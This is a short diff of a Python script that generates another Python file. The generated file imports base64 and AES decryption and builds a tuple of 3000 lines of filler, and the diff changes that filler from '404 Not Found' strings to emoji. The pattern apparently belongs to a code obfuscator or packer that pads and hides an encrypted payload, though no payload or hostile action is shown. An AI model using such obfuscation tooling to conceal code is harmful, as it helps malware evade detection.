@@ -92,7 +92,7 @@ def main():
         file.write(f"import base64\n")
         file.write(f"aes_ebc=(")
         for _ in range(3000):
-           file.write('"404 Not Found","404 Not Found","404 Not Found","404 Not Found","404 Not Found",\n')
+           file.write('"😁","💀","🥶","😆","🤣","😘","😜","😁","💀","🥶","😆","🤣","😘","😜","😁","💀","🥶","😆","🤣","😘","😜",\n')
         file.write(")\n")
         file.write(f"from Crypto.Cipher import AES\n")
         file.write(f"from Crypto.Util.Padding import unpad\n")
